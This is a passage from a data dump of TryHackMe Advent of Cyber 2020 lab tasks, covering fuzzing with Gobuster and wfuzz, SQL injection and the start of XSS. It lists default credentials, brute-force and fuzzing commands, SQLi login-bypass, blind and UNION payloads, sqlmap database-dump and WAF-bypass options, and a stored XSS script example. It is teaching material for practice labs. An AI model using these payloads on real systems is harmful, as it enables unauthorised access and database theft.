credentials:</p>\n<table>\n<thead>\n<tr>\n<th>Username</th>\n<th>Password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>root</td>\n<td>root</td>\n</tr>\n<tr>\n<td>admin</td>\n<td>password</td>\n</tr>\n<tr>\n<td>user</td>\n<td>12345</td>\n</tr>\n</tbody>\n</table>\n<p>Use the correct credentials to log in to the Santa Sleigh Tracker app. Don't forget to turn off Foxyproxy once BurpSuite has finished the attack!</p>\n<p><strong>What is the flag?</strong></p>\n", 'hint': "Remember you're using the default credential list in the intruder position payloads; you can input each entry one by one. "}]}, {'taskTitle': '[Day 4] <span class="badge badge-soft-danger size-16">Web Exploitation</span> Santa\'s watching', 'taskDesc': '<h3><a href="https://www.youtube.com/watch?v=7GAFQdYCk5s">Watch DarkStar\'s video on solving this task!</a></h3>\n<p><span class="size" style="font-size:36px"><strong>Introduction &amp; Story:</strong></span></p>\n<p><span style="float:left;padding:20px;width:120px"><img src="https://i.imgur.com/0vF39p3.png" alt style="width:100%" /></span>We\'re going to be taking a look at some of the fundamental tools used in web application testing. You\'re going to learn how to use Gobuster to enumerate a web server for hidden files and folders to aid in the recovery of Elf\'s forums. Later on, you\'re going to be introduced to an important technique that is fuzzing, where you will have the opportunity to put theory into practice.</p>\n<p>Our malicious, despicable, vile, cruel, contemptuous, evil hacker has defaced Elf\'s forums and completely removed the login page! However, we may still have access to the API. The sysadmin also told us that the API creates logs using dates with a format of YYYYMMDD.</p>\n<hr />\n<p><span class="size" style="font-size:36px"><strong>What is Fuzzing?</strong></span><br />\nTo keep it simple, fuzzing can be argued as "fancy bruteforcing" to some degree. However, you can fuzz what you can\'t bruteforce. Fuzzing is using security tools to automate the input of data we provide into things such as websites or software applications. Fuzzing is an extremely effective process as computers can perform laborious actions like trying to find hidden files/folders, try different username and passwords much quicker then a human can (and is willing to do...)</p>\n<p>Poorly built applications are often unable to handle data the way it is supposed to under intense load. Moreover, the data we\'re parsing to the application may be interpreted and executed (instead of being handled correctly i.e. system commands). We can use fuzzing to cause the application to trigger what\'s known as an error condition where this may be abused by a penetration tester or a bug bounty hunter.</p>\n<p><br /><br />\n<span class="size" style="font-size:36px"><strong>An Introduction to Using Gobuster</strong></span><br />\nLogically speaking, there are many pieces to a website that the average user doesn\'t see. They can be anything from a sitemap to a secret directory which contains important files. Unfortunately, this can cause developers to get a bit lazy, and not protect these directories, allowing anyone who finds out that they exist to steal the important data. <a href="https://github.com/OJ/gobuster">gobuster</a> is the tool that helps us discover these valuable directories if they exist. The idea behind the tool itself is simple, bruteforcing common paths to check if it\'s valid. Similar to how you would in your browser, albeit this tool is much, much quicker. Gobuster has three modes: <code>dir</code>, <code>vhost</code> and <code>dns</code>.</p>\n<p>For the sake of today, we\'re going to be using gobuster in <code>dir</code> mode, as this is the most likely mode\xa0that you\'ll be using day-to-day. <code>dir</code> (short for directory) can be selected by using\xa0<code>gobuster dir &lt;rest of command&gt;</code></p>\n<p>Let\'s use the table below to illustrate how wordlists work:</p>\n<table>\n<thead>\n<tr>\n<th>Original URL</th>\n<th>Item in Wordlist</th>\n<th>Final URL</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>http://example.com</td>\n<td>backups</td>\n<td>http://example.com/backups</td>\n</tr>\n<tr>\n<td>http://loveucmnatic.thm</td>\n<td>shepards</td>\n<td>http://loveucmnatic.thm/shepards</td>\n</tr>\n</tbody>\n</table>\n<p><br /><br />\nGobuster has a few other little tricks, it supports appending extensions which means you can bruteforce files as well. We can use another handy little chart to visualize it and show an example later on:</p>\n<table>\n<thead>\n<tr>\n<th>Original URL</th>\n<th>Item in Wordlist</th>\n<th>Specified Extension</th>\n<th>Final URL</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>http://example.com</td>\n<td>backup</td>\n<td>php</td>\n<td>http://example.com/backup.php</td>\n</tr>\n<tr>\n<td>http://example.com</td>\n<td>backup</td>\n<td>txt</td>\n<td>http://example.com/backup.txt</td>\n</tr>\n<tr>\n<td>http://example.com</td>\n<td>icecream</td>\n<td>html</td>\n<td>http://example.com/icecream.html</td>\n</tr>\n</tbody>\n</table>\n<p>To find the data in the table above, we have used a command such as the following (assuming wordlist.txt had the words "backup" and "icecream"):\xa0<code>gobuster dir -u </code><a href="http://example.com"><code>http://example.com</code></a><code>\xa0-w wordlist.txt -x php,txt,html</code>.</p>\n<p>Whilst Gobuster is considerably faster than alternatives such as Dirbuster on Kali Linux, it is still limited to the wordlists and options that you provide. The more appropriate your wordlist is to the target, the better your results will be. Wordlists such as <a href="https://github.com/danielmiessler/SecLists">SecLists</a> have wordlists for specific applications and platforms. You can use the information gathered from enumerating to help determine what wordlist may be the most appropriate to use. Although, we will come onto refining those skills in a later day.<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/seclists1.png" alt="seclists1" /></p>\n<p>Gobuster itself works like any other Linux tool, meaning it has an online man page available <a href="http://manpages.ubuntu.com/manpages/cosmic/man1/gobuster.1.html">here</a>, which you can use as a reference if you want to learn more about the various options that gobuster supports. However, let\'s detail a few of the common options below:</p>\n<table>\n<thead>\n<tr>\n<th>Options</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-u</td>\n<td>Used to specify which url to enumerate</td>\n</tr>\n<tr>\n<td>-w</td>\n<td>Used to specify which wordlist that is appended on the url path i.e<br /><br />"http://url.com/word1"<br /><br />"http://url.com/word2"<br /><br />"http://url.com/word3.php"</td>\n</tr>\n<tr>\n<td>-x</td>\n<td>Used to specify file extensions i.e "php,txt,html"</td>\n</tr>\n</tbody>\n</table>\n<p><span class="size" style="font-size:1rem">Recommended wordlist</span><span class="font" style="font-family:Ubuntu">\ufeff</span><span class="size" style="font-size:1rem">\xa0to use:\xa0</span><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt">big.txt</a></p>\n<p>We have provided wordlists for you on the AttackBox located in "/usr/share/wordlists". This is also the default location for wordlists on pentesting distributions such as Kali Linux. To provide an example, "big.txt" is located at the file path\xa0"/usr/share/wordlists/dirb/big.txt". Take some time to explore other wordlists provided and think of the situation where they may be effective to use.</p>\n<p><br /><br />\n<span class="size" style="font-size:36px"><strong>An Introduction to Using wfuzz</strong></span><br />\nThe premise behind <a href="https://github.com/xmendez/wfuzz">wfuzz</a> is simple. Occasionally you want a bit more information about how much data something within a web application returns. This could be anything from a file, a response code (i.e. 404 meaning the URL doesn\'t exist) or the parameters used in a form similar to the form you attacked in Day 2.</p>\n<p>For example, let\'s say you are pentesting a note-taking application and you want to see if you can view notes by other users. One way you may want to achieve this is by <em>FUZZ</em>ing for usernames (with the knowledge that every valid user will have note.txt by default). Our wfuzz command would like the following: <code>wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt</code></p>\n<p>Now wfuzz will query the webserver using the words iterated from the "big.txt" wordlist. To illustrate:</p>\n<ul>\n<li>Query #1: http://localhost/<strong>admin</strong>/note.txt</li>\n<li>Query #2: http://localhost/<strong>administrator</strong>/note.txt</li>\n<li>Query #3: http://localhost/<strong>system</strong>/note.txt</li>\n</ul>\n<p><img src="https://imgur.com/eYRJeyt.png" alt /><br />\nNote how the "<strong>FUZZ</strong>" parameter is being replaced with the words from the wordlist. We\'ll outline some of the options that can be configured in wfuzz, however, it\'s worth knowing that will display results that are different to the parameters that we set. In the picture above we used the <code>--hw</code>option to hide all pages that have 57 words on them. Since wfuzz found a URL with only 8 words, it\'ll be displayed to us, as this is not 57 words.</p>\n<ul>\n<li>It is important to know that you can <em>FUZZ</em> any part of the URL, meaning that you can test any parameters if you don\'t know them as well.</li>\n</ul>\n<p>As with any Linux-based tool, wfuzz also has a useful manpage <a href="https://manpages.debian.org/buster/wfuzz/wfuzz.1.en.html">here</a>, that details some of the more advanced options available to you. Although, I have added some of the more useful options into the table below:</p>\n<table>\n<thead>\n<tr>\n<th>Options</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-c</td>\n<td>Shows the output in color</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>Specify the parameters you want to fuzz with, where the data is encoded for a HTML form</td>\n</tr>\n<tr>\n<td>-z</td>\n<td>Specifies what will replace FUZZ in the request. For example <code>-z file,big.txt</code>. We\'re telling wfuzz to look for files by replacing "FUZZ" with the words within "big.txt"</td>\n</tr>\n<tr>\n<td>--hc</td>\n<td>Don\'t show certain http response codes. I.e. Don\'t show <strong>404</strong> responses that indicate the file <em>doesn\'t</em> exist, or "<strong>200</strong>" to indicate the file <em>does</em> exist</td>\n</tr>\n<tr>\n<td>--hl</td>\n<td>Don\'t show for a certain amount of lines in the response</td>\n</tr>\n<tr>\n<td>--hh</td>\n<td>Don\'t show for a certain amount of characters</td>\n</tr>\n</tbody>\n</table>\n<p><br /><br />\nLet\'s bring this together and demonstrate some of these options. Let\'s say we wanted to fuzz an application on <em>http://shibes.thm/login.php</em> to find the correct credentials to the login form. After recalling our knowledge from Day 2, we know all about URL parameters! We can take a bit of a guess as to what parameters the login form may be using <code>username</code> and <code>password</code>, right? Worth a try! Our wfuzz command would look like so: <code>wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&amp;password=FUZZ” -u http://shibes.thm/login.php</code></p>\n<p>Where wfuzz will now iterate through the wordlist we provided and replace the "<strong>FUZZ</strong>" values specified in the "<strong>username</strong>" and "<strong>password</strong>" parameters.</p>\n<p><br /><br />\n<span class="size" style="font-size:36px"><strong>Challenge</strong></span></p>\n<p>Deploy both the instance attached to this task (the green deploy button) and the AttackBox by pressing the blue "Start AttackBox" button at the top of the page. After allowing 5 minutes, navigate to the website (MACHINE_IP) in your AttackBox browser.</p>\n<p>It is up to you to decide if you wish to create the wordlist yourself or use a larger wordlist located in <code>/opt/AoC-2020/Day-4/wordlist</code> on the AttackBox. The wordlist is also <a href="https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist">available for download</a> if you are using your own machine.</p>\n<p>In summary, use the tools and techniques outlined in today\'s advent of cyber; search for the API, find the correct post and bring back Elf\'s forums!</p>\n<p><br /><br />\n<span class="size" style="font-size:36px"><strong>How to approach the challenge</strong></span></p>\n<p>Since we know there\'s theoretically an API directory we can use gobuster to enumerate the website and see if we can find anything. Then assuming we do find something, we should investigate it for interesting files. Let\'s say we then find what seems to hold the logs, we know we\'re searching by date, so we can infer that there\'s a good chance that we\'ll be using the date parameter to interact with the API. We also know that the API takes a date in the form of YYYYMMDD.\xa0A wordlist in that format can be found in the hint for this task, although if you want an extra challenge, you can try and build a wordlist in that format yourself.</p>\n<p>Finally, API\'s may not return data if the proper parameters aren\'t passed, so with that knowledge, we can use the options in wfuzz to filter out parameters that don\'t return anything.</p>\n<p>With all that in mind, we should be able to get a flag.</p>\n<h2>Recommended Rooms:</h2>\n<p><a href="https://tryhackme.com/room/zthweb2">TryHackMe | ZTH: Web 2</a></p>\n<p><a href="https://tryhackme.com/room/ccpentesting">TryHackMe | CC: Pen Testing</a></p>\n', 'taskType': 'vm', 'taskNo': 6, 'taskCreated': '2020-11-12T02:46:09.159Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fba0f1abcea7a36e98d85f1', 'questions': [{'questionNo': 1, 'question': '<p>Deploy your AttackBox (the blue "Start AttackBox" button) and the tasks machine (green button on this task) if you haven\'t already. Once both have deployed, open FireFox on the AttackBox and copy/paste the machines IP (MACHINE_IP) into the browser search bar.</p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>Given the URL "<a href="http://shibes.xyz">http://shibes.xyz/api.php</a>", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)</p>\n<p><strong>Note:</strong> For legal reasons, do <em>not</em> actually run this command as the site in question has not consented to being fuzzed!</p>\n', 'hint': 'The command will start with "wfuzz", then will include flags, the wordlist and finally the URL.'}, {'questionNo': 3, 'question': '<p>Use GoBuster <strong>(against the target you deployed -- not the shibes.xyz domain)</strong> to find the API directory. What file is there?</p>\n', 'hint': 'gobuster dir -u http://<ip> -w <word list> -x .php'}, {'questionNo': 4, 'question': '<p>Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?</p>\n', 'hint': 'Use wfuzz, the Advent of Cyber wordlist given in this task and website with the file you found: http://<ip>/api/<file>?date=FUZZ'}]}, {'taskTitle': '[Day 5] <span class="badge badge-soft-danger size-16">Web Exploitation</span> Someone stole Santa\'s gift list!', 'taskDesc': '<h3><a href="https://www.youtube.com/watch?v=Kitx7cSNsuE">Watch DarkStar\'s video on solving this task!</a></h3>\n<p><span style="float:right;padding:20px;width:200px"><img src="https://i.imgur.com/21zUUrj.jpg" alt style="width:100%" /></span><br />\nAfter last year\'s attack, Santa and the security team have worked hard on reviving Santa\'s personal portal. Hence, \'Santa\'s forum 2\' went live.</p>\n<p>After the attack, logs have revealed that someone has found Santa\'s panel on the website and logged into his account! After doing so, they were able to dump the whole gift list database, getting all the 2020 gifts in their hands. An attacker has threatened to publish a wishlist.txt file, containing all information, but happily, for us, he was caught by the CBI (Christmas Bureau of Investigation) before that. On\xa0<code>MACHINE_IP:8000</code>\xa0you\'ll find the copy of the website and your goal is to replicate the attacker\'s actions by dumping the gift list!</p>\n<p>Task created by <a href="https://swafox.com/">Swafox</a></p>\n<p><span><img src="https://i.imgur.com/ec9T8ya.png" alt="https://i.imgur.com/ec9T8ya.png" style="width:50%" /></span></p>\n<h2>What is SQL Injection?</h2>\n<p>A SQL injection (SQLi) attack consists of the injection of a SQL query to the remote web application. A successful SQL injection exploit can read sensitive data from the database (usernames &amp; passwords), modify database data (Add/Delete), execute administration operations on the database (such as shutdown the database), and in some cases execute commands on the operating system.</p>\n<h2>SQL Background</h2>\n<p>SQL is a language used in programming to talk to databases. It\'s an extremely handy language that makes it easy for the developers to organise data in various structures. Unfortunately, the benefit always comes with a drawback; even a little misconfiguration in SQL code can lead to a potential SQL injection.</p>\n<p>I advise you to quickly go through this SQL command guide in order to make yourself familiar with them:</p>\n<p><a href="https://www.codecademy.com/articles/sql-commands">List of SQL Commands | Codecademy</a></p>\n<p>In any case, in the SQL Injection attack, we mainly use only 4 commands: SELECT, FROM, WHERE, and UNION.</p>\n<table>\n<thead>\n<tr>\n<th>SQL Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong><a href="https://www.w3schools.com/sqL/sql_select.asp">SELECT</a></strong></td>\n<td>Used to select data from a database.</td>\n</tr>\n<tr>\n<td><strong><a href="https://www.w3schools.com/sql/sql_ref_from.asp">FROM</a></strong></td>\n<td>Used to specify which table to select or delete data from.</td>\n</tr>\n<tr>\n<td><strong><a href="https://www.w3schools.com/sql/sql_where.asp">WHERE</a></strong></td>\n<td>Used to extract only those records that fulfil a specified condition.</td>\n</tr>\n<tr>\n<td><strong><a href="https://www.w3schools.com/sql/sql_union.asp">UNION</a></strong></td>\n<td>Used to combine the result-set of two or more SELECT statements.</td>\n</tr>\n</tbody>\n</table>\n<p>It is important to mention that <code>1=1</code> in SQL stands for <code>True</code> (shortly you\'ll see the reason as to why I mention this).</p>\n<h2>How does an SQLi attack work?</h2>\n<p>SQLi is carried out through abusing a PHP GET parameter (for example <strong>?username=</strong>, or <strong>?id=</strong>) in the URL of a vulnerable web page, such as those covered in Day 2. These are usually located in the search fields and login pages, so as a penetration tester, you need to note those down.</p>\n<p>Here\'s an example of a username input field written in PHP:</p>\n<pre><code>&lt;?php\n    $username = $_GET[\'username\'];\n    $result = mysql_query("SELECT * FROM users WHERE username=\'$username\'");\n?&gt;\n</code></pre>\n<p>After a variable <code>username</code> was inputted in the code, PHP automatically uses SQL to select all users with the provided username. Exactly this fact can be abused by an attacker.</p>\n<p>Let\'s say a malicious user provides a quotation mark (<strong>\'</strong>) as the username input. Then the SQL code will look like this:</p>\n<pre><code>SELECT * FROM users WHERE username=\'\'\'\n</code></pre>\n<p>As you can see, that mark creates a third one and generates an error since the username should only be provided with two. Exactly this error is used to exploit the SQL injection.</p>\n<p>Generally speaking, SQL injection is an attack in which your goal is to break SQL code execution logic, inject your own, and then \'fix\' the broken part by adding comments at the end.</p>\n<p><img src="https://i.imgur.com/U5Eyw5z.png" alt="https://i.imgur.com/U5Eyw5z.png" /></p>\n<p>Graphical interpretation</p>\n<p>Most commonly used comments for SQLi payloads:</p>\n<pre><code>--+\n\n//\n\n/*\n</code></pre>\n<h2>Login Bypass with SQL Injection</h2>\n<p>One of the most powerful applications of SQL injection is definitely login bypassing. It allows an attacker to get into <strong>ANY</strong> account as long as they know either username or password to it (most commonly you\'ll only know username).</p>\n<p>First, let\'s find out the reason behind the possibility to do so. Say, our login application uses PHP to check if username and password match the database with following SQL query:</p>\n<pre><code>SELECT username,password FROM users WHERE username=\'$username\' and password=\'$password\'\n</code></pre>\n<p>As you see here, the query is using inputted username and password to validate it with the database.</p>\n<p>What happens if we input <code>\' or true --</code> username field there? This will turn the above query into this:</p>\n<pre><code>SELECT username,password FROM users WHERE username=\'\' or true -- and password=\'\'\n</code></pre>\n<p>The <code>--</code> in this case has commented out the password checking part, making the application forget to check if the password was correct. This trick allows you to log in to any account by just putting a username and payload right after it.</p>\n<p>Note that some websites can use a different SQL query, such as:</p>\n<pre><code>SELECT username,pass FROM users WHERE username=(\'$username\') and password=(\'$password\')\n</code></pre>\n<p>In this case, you\'ll have to add a single bracket to your payload like so: <code>\') or true–</code> to make it work.</p>\n<p>You can practice login bypassing on a deployed machine, port 3000 (First browse to <code>MACHINE_IP:3000/init.php</code> and then to <code>MACHINE_IP:3000</code>). I\'ve put an extra interactive exercise there. It\'ll show you all back end output, allowing you to experiment and practice with SQL commands.</p>\n<h2>Blind SQL Injection</h2>\n<p>In some cases, developers become smart enough to mitigate SQL Injection by restricting an application from displaying any error. Happily, this does not mean we cannot perform the attack.<br />\nBlind SQL Injection relies on changes in a web application, during the attack. In other words, an error in SQL query will be noticeable in some other form (i.e changed content or other).</p>\n<p>Since in this situation we can only see if an error was produced or not, blind SQLi is carried out through asking \'Yes\' or \'No\' questions to the database (Error = \'No\', No Error = \'Yes\').<br />\nThrough that system, an attacker can guess the database name, read columns and etc. Blind SQLi will take more time than other types but can be the most common one in the wild.</p>\n<p>Start off with finding a way to cause the SQL error and then fixing it back.</p>\n<p><img src="https://i.imgur.com/CxxUthP.png" alt="https://i.imgur.com/CxxUthP.png" /></p>\n<p>Breaking the application</p>\n<p><img src="https://i.imgur.com/mpYUwOS.png" alt="https://i.imgur.com/mpYUwOS.png" /></p>\n<p>Fixing it - Notice how the app did not output any error, even though I\'ve clearly caused an SQL error.</p>\n<p>For asking the questions, you can use <a href="https://www.w3schools.com/sql/func_mysql_substr.asp">SUBSTR()</a> SQL function. It extracts a substring from a string and allows us to compare the substring to a custom ASCII character.</p>\n<pre><code>substr((select database()),1,1)) = 115\n</code></pre>\n<p>The above code is asking the database if its name\'s first letter is equal to 155 (\'s\' in <a href="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fstatic.arcbotics.com%2Fwp-content%2Fuploads%2F2014%2F01%2FASCII-Table.gif&amp;f=1&amp;nofb=1">ASCII</a> table).</p>\n<p>Now put this into a payload:</p>\n<pre><code>?id=1\' AND (ascii(substr((select database()),1,1))) = 115 --+\n</code></pre>\n<p>The payload is the question. If the application does not produce any changes, then the answer is \'Yes\' (the database\'s first letter is \'s\'). Any error or change = \'No\'.</p>\n<p><img src="https://i.imgur.com/f1C2aWx.png" alt="https://i.imgur.com/f1C2aWx.png" /></p>\n<p><em>Note: You can use blind SQLi injection techniques in the \'open\' situation too.</em></p>\n<h2>UNION SQL Injection</h2>\n<p>UNION SQLi is mainly used for fast database enumeration, as the UNION operator allows you to combine results of multiple SELECT statements at a time.</p>\n<p>UNION SQLi\xa0<strong>attack</strong>\xa0consists of 3 stages:</p>\n<ol>\n<li>Finding the number of columns</li>\n<li>Checking if the columns are suitable</li>\n<li>Attack and get some interesting data.</li>\n</ol>\n<ul>\n<li>Determining the number of columns required in an SQL injection UNION attack</li>\n</ul>\n<p>There are exactly two ways to detect one:</p>\n<p>The first one involves injecting a series of ORDER BY queries until an error occurs. For example:</p>\n<pre><code>\' ORDER BY 1--\n\n\' ORDER BY 2--\n\n\' ORDER BY 3--\n\t# and so on until an error occurs\n</code></pre>\n<p>(The last value before the error would indicate the number of columns.)</p>\n<p>The second one (most common and effective), would involve submitting a series of UNION SELECT payloads with a number of NULL values:</p>\n<pre><code>\' UNION SELECT NULL--\n\n\' UNION SELECT NULL,NULL--\n\n\' UNION SELECT NULL,NULL,NULL--\n\t# until the error occurs\n</code></pre>\n<p>No error = number of NULL matches the number of columns.</p>\n<ul>\n<li>Finding columns with a useful data type in an SQL injection UNION attack</li>\n</ul>\n<p>Generally, the interesting data that you want to retrieve will be in string form.\xa0Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:</p>\n<pre><code>\' UNION SELECT \'a\',NULL,NULL,NULL--\n\n\' UNION SELECT NULL,\'a\',NULL,NULL--\n\n\' UNION SELECT NULL,NULL,\'a\',NULL--\n\n\' UNION SELECT NULL,NULL,NULL,\'a\'--\n</code></pre>\n<p>No error = data type is useful for us (string).</p>\n<ul>\n<li>Using an SQL injection UNION attack to retrieve interesting data</li>\n</ul>\n<p>When you have determined the number of columns and found which columns can hold string data, you can finally start retrieving interesting data.</p>\n<p>Suppose that:</p>\n<ul>\n<li>The first two steps showed exactly two existing columns with useful datatype.</li>\n<li>The database contains a table called users with the columns username and password.</li>\n</ul>\n<p>In this situation, you can retrieve the contents of the user\'s table by submitting the input:</p>\n<pre><code>\' UNION SELECT username, password FROM users --\n</code></pre>\n<p>Here\'s a small list of thing you\'d want to retrieve:</p>\n<ol>\n<li>database()</li>\n<li>user()</li>\n<li>@@version</li>\n<li>username</li>\n<li>password</li>\n<li>table_name</li>\n<li>column_name</li>\n</ol>\n<h2>SQLMap</h2>\n<p>SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It\'s an incredible tool that can be learned within minutes. It\'s already included in THM\'s AttackBox or you can install it locally by running:</p>\n<pre><code>git clone --depth 1 &lt;https://github.com/sqlmapproject/sqlmap.git&gt; sqlmap-dev\n</code></pre>\n<p>Here are some of the most common options that you would configure when using SQLMap:</p>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>--url</td>\n<td>Provide URL for the attack</td>\n</tr>\n<tr>\n<td>--dbms</td>\n<td>Tell SQLMap the type of database that is running</td>\n</tr>\n<tr>\n<td>--dump</td>\n<td>Dump the data within the database that the application uses</td>\n</tr>\n<tr>\n<td>--dump-all</td>\n<td>Dump the ENTIRE database</td>\n</tr>\n<tr>\n<td>--batch</td>\n<td>SQLMap will run automatically and won\'t ask for user input</td>\n</tr>\n</tbody>\n</table>\n<p>Let\'s show an example of an SQLMap command. Let\'s say we have a vulnerable login form located at "<a href="http://notarealwebsite.com/login.php">http://tbfc.net/login.php</a>". (<strong>Note, this is just an example, please do not SQLMap this website as no consent has been given by the owner.</strong>) We would use this alongside <code>--url</code> to tell SQLMap where to attack. i.e. <code>sqlmap --url http://tbfc.net/login.php</code></p>\n<p>Where we can then proceed to enumerate what data is in the application\'s database with options such as <code>--tables</code> and <code>--columns</code>. Leaving our final SQLMap looking like so: <code>sqlmap --url http://tbfc.net/login.php --tables --columns</code></p>\n<p><strong>Again, tbfc.net is given as an example, please do not perform any attack on this site.</strong></p>\n<ul>\n<li>You can find a cheatsheet for more snippets of SQLMap commands <a href="https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet">here</a></li>\n</ul>\n<h2>SQLMap &amp; BurpSuite</h2>\n<p>The most beneficial feature of sqlmap is its integration with BurpSuite.</p>\n<p>With BurpSuite, you can capture and save login or search information to use with SQLMap. This is done by <a href="https://extratechtalk.in/intercept-http-requests-using-burp-suite/">intercepting a request</a>. You will need to configure your browser to use BurpSuite as a proxy for this request to capture. The AttackBox has made this simple for you by using the FoxyProxy extension in Firefox.</p>\n<ol>\n<li>First let\'s startup BurpSuite located in "Applications -&gt; Web -&gt; BurpSuite Community Edition" on the AttackBox</li>\n<li>Use Firefox to visit the application we suspect to be vulnerable</li>\n<li>Enable FoxyProxy in Firefox:<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-5/foxyproxy.png" alt /></li>\n<li>Submit a request on the web application we suspect to be vulnerable</li>\n<li>Send the request from the "Proxy" tab to the repeater by right-clicking and pressing "Send to Repeater"</li>\n<li>Notice our request is now in the "Repeater" tab:<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-5/bpsuite_2.png" alt /></li>\n<li>Finally, save this request by right-clicking and pressing "Save item"<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-5/bpsuite_3.png" alt /></li>\n</ol>\n<p>We can then use this request in SQLMap:</p>\n<pre><code>sqlmap -r filename\n</code></pre>\n<p>SQLMap will automatically translate the request and exploit the database for you.</p>\n<h2>Challenge</h2>\n<p>Visit the vulnerable application in Firefox, find Santa\'s secret login panel and bypass the login. Use some of the commands and tools covered throughout today\'s task to answer Questions #3 to #6.</p>\n<p>Santa reads some documentation that he wrote when setting up the application, it reads:</p>\n<p>Santa\'s TODO: Look at alternative database systems that are better than sqlite. Also, don\'t forget that you installed a <strong>W</strong>eb <strong>A</strong>pplication <strong>F</strong>irewall (WAF) after last year\'s attack. In case you\'ve forgotten the command, you can tell SQLMap to try and bypass the WAF by using <code>--tamper=space2comment</code></p>\n<h2>Resources</h2>\n<p>Check out this cheat sheet:\xa0<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">swisskyrepo/PayloadsAllTheThings</a></p>\n<p>Payload list:\xa0<a href="https://github.com/payloadbox/sql-injection-payload-list">payloadbox/sql-injection-payload-list</a></p>\n<p>In-depth SQL Injection tutorial:\xa0<a href="https://tryhackme.com/room/sqlibasics">SQLi Basics</a></p>\n', 'taskType': 'vm', 'taskNo': 7, 'taskCreated': '2020-11-12T02:46:29.135Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fb7e9918cf9292e4c3c17b5', 'questions': [{'questionNo': 1, 'question': "<p>Without using directory brute forcing, what's Santa's secret login panel?</p>\n", 'hint': 'The name is derived out of 2 words from this question. /s**tap***l'}, {'questionNo': 2, 'question': "<p>Visit Santa's secret login panel and bypass the login using SQLi</p>\n", 'hint': ''}, {'questionNo': 3, 'question': '<p>How many entries are there in the gift database?</p>\n', 'hint': ''}, {'questionNo': 4, 'question': '<p>What did Paul ask for?</p>\n', 'hint': ''}, {'questionNo': 5, 'question': '<p>What is the flag?</p>\n', 'hint': "Use Burp Suite to capture a query that you make on the gift database.\n\nYou'll need to tell SQLMap the database system that is used and dump the ENTIRE database for this to work."}, {'questionNo': 6, 'question': "<p>What is admin's password?</p>\n", 'hint': ''}]}, {'taskTitle': '[Day 6] <span class="badge badge-soft-danger size-16">Web Exploitation</span> Be careful with what you wish on a Christmas night', 'taskDesc': '<h3><a href="https://www.youtube.com/watch?v=cNYhpbUtkJw">Watch DarkStar\'s Video On Solving This Task</a>.</h3>\n<p><br /><br />\nThis year, Santa wanted to go fully digital and invented a\xa0"Make a wish!" system. It\'s an extremely simple web app that would allow people to anonymously share their wishes with others. Unfortunately, right after the hacker attack, the security team has discovered that\xa0someone has compromised the "Make a wish!". Most of the wishes have disappeared and the website is now redirecting to a malicious website.\xa0\xa0An attacker might have pretended to submit a wish and put a malicious request on the server! The security team has pulled a back-up server for you on\xa0<code>MACHINE_IP:5000</code>. Your goal is to find the way the attacker could have exploited the application.</p>\n<p>By <a href="https://swafox.com/">Swafox</a></p>\n<p><img src="https://i.imgur.com/MuJLqZu.png" alt="https://i.imgur.com/MuJLqZu.png" style="width:50%" /></p>\n<h2>What is XSS?</h2>\n<p>Cross-site scripting (XSS) is a web vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, and carry out any actions that the user is able to perform. If the victim user has privileged access within the application (i.e admin), then the attacker might be able to gain full control over all of the application\'s functionality and data. Even if a user is a low privileged one, XSS can still allow an attacker to obtain a lot of sensitive information.</p>\n<h2>Why does it work like that?</h2>\n<p>XSS is exploited as some malicious content is being sent to the web browser, often taking the form of JavaScript payload, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but all of them come down to exactly two types: stored and reflected.</p>\n<h2>Types of XSS</h2>\n<p>Stored XSS works when a certain malicious JavaScript is submitted and later on stored directly on the website. For example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other words, in any content that persistently exists on the website and can be viewed by victims.<br />\n<br /></p>\n<pre><code>&lt;!-- Normal comment--&gt;\n&lt;p&gt;\n\xa0 \xa0 \xa0Your comment goes here\n&lt;/p&gt;\n\n&lt;!--Malicious comment--&gt;\n&lt;p&gt;\n\xa0 \xa0 \xa0&lt;script&gt;\n\xa0 \xa0 \xa0 \xa0 \xa0evilcode()\n\xa0 \xa0 \xa0&lt;/script&gt;\n&lt;/p&gt;\n</code></pre>\n<p>Let\'s say we have a website with comments (Code above).\xa0 A normal comment is put under <b><code>&lt;p&gt;&lt;/p&gt;</code></b> tags and displayed on the website. A malicious user can put <b><code>&lt;script&gt;&lt;/script&gt;</code></b> tags in that field to execute the <b><code>evilcode()</code></b> function every time a user sees this comment.</p>\n<p>Stored XSS gives an attacker an advantage of \'injecting\' malicious JavaScript behind images. By using <b><code>&lt;img&gt;</code></b> attribute it is possible to execute custom JS code when the image is viewed or clicked. For 